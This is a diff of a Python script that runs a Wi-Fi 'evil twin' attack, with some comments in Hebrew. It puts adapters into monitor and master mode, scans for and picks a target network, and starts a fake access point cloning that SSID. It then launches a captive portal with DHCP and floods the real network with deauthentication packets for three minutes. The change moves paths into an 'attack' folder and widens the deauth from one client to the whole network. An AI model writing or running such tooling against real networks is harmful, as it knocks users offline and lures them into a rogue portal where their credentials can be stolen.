@@ -11,10 +11,10 @@ import sys
 
 ADAPTER_INTERFACE = "wlp4s0f4u1"
 MY_INTERFACE = "wlp2s0"
-MONITOR_SCRIPT = "../change_interface_mode/set_monitor.sh"
-MANAGED_SCRIPT = "../change_interface_mode/set_managed.sh"
-MASTER_SCRIPT = "../change_interface_mode/set_master.sh"
-HOSTAPD_SCRIPT = "./start_network.sh"
+MONITOR_SCRIPT = "./change_interface_mode/set_monitor.sh"
+MANAGED_SCRIPT = "./change_interface_mode/set_managed.sh"
+MASTER_SCRIPT = "./change_interface_mode/set_master.sh"
+HOSTAPD_SCRIPT = "./attack/start_network.sh"
 
 def wait_for_enter():
     input("⏸️ Press Enter to continue...\n")
@@ -46,13 +46,13 @@ def enable_master_mode(interface):
 def start_hostapd(ssid, interface):
     print(f"[*] Running start_hostapd('{ssid}') on interface {interface} from Bash script...")
     try:
-        subprocess.run(["bash", "start_network.sh", "run_function", "start_hostapd", interface, ssid], check=True)
+        subprocess.run(["bash", "./attack/start_network.sh", "run_function", "start_hostapd", interface, ssid], check=True)
     except subprocess.CalledProcessError:
         print("❌ Failed to run start_hostapd from script.")
         exit(1)
 
 HOSTAPD_PID_FILE = "hostapd.pid"  # או הנתיב המלא לקובץ PID אם שונה
-HOSTAPD_CONFIG = "hostapd.conf"  # שם קובץ הקונפיגורציה
+HOSTAPD_CONFIG = "./attack/hostapd.conf"  # שם קובץ הקונפיגורציה
 
 def cleanup_hostapd():
     print("🧹 Cleaning up hostapd processes...")
@@ -79,6 +79,11 @@ def cleanup_hostapd():
             subprocess.run(["kill", "-9"] + pids)
     except Exception as e:
         print(f"⚠️ Failed to clean up extra processes: {e}")
+    
+    print("[*] Restarting NetworkManager...")
+    subprocess.run(["systemctl", "start", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run(["systemctl", "start", "wpa_supplicant"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
 
 atexit.register(cleanup_hostapd)
 atexit.register(enable_managed_mode, MY_INTERFACE)
@@ -98,37 +103,38 @@ signal.signal(signal.SIGTERM, handle_signal)  # kill
 
 def main():
     # Step 0: Switch to monitor mode
-    print("🚀 Step 0: Set monitor mode")
+    print("🚀 Step 0: Change mode")
     enable_monitor_mode(ADAPTER_INTERFACE)
-    #enable_managed_mode(MY_INTERFACE)
+    enable_master_mode(MY_INTERFACE)
 
     print("\n🚀 Step 1: Scanning Wi-Fi Networks")
-    bssid, ssid, client = scan_wifi_networks(ADAPTER_INTERFACE)
+    bssid, ssid = scan_wifi_networks(ADAPTER_INTERFACE)
 
-    if not bssid or not ssid or not client:
-        print("❌ Failed to select network/client.")
+    if not bssid or not ssid:
+        print("❌ Failed to select network.")
         return
     wait_for_enter()
 
-    # Step 1.5: Switch to master mode
-    enable_master_mode(ADAPTER_INTERFACE)
-    enable_monitor_mode(MY_INTERFACE)
-
     print("\n🚀 Step 2: Starting Hostapd (Fake AP)")
-    hostapd_thread = threading.Thread(target=start_hostapd, args=(ssid, ADAPTER_INTERFACE,), daemon=True)
+    hostapd_thread = threading.Thread(target=start_hostapd, args=(ssid, MY_INTERFACE,), daemon=True)
     hostapd_thread.start()
     time.sleep(3)
     wait_for_enter()
 
     print("\n🚀 Step 3: Launching Captive Portal with DHCP")
-    captive_portal_thread = threading.Thread(target=start_captive_portal, args=(ADAPTER_INTERFACE,), daemon=True)
+    captive_portal_thread = threading.Thread(target=start_captive_portal, args=(MY_INTERFACE,), daemon=True)
     captive_portal_thread.start()
     time.sleep(3)
     wait_for_enter()
 
     print("\n🚀 Step 4: Sending Deauthentication Attack")
-    send_deauth_to_client(interface=MY_INTERFACE, bssid=bssid, target_mac=client, count=100, interval=0.1)
-
+    send_deauth_to_client(
+        interface=ADAPTER_INTERFACE,
+        bssid=bssid,
+        duration=180,         # זמן התקיפה בשניות
+        batch_count=20,      # כמה חבילות כל פעם
+        interval=0.05        # פער בין כל חבילה
+    )
     cleanup_hostapd()
     enable_managed_mode(MY_INTERFACE)
     enable_managed_mode(ADAPTER_INTERFACE)
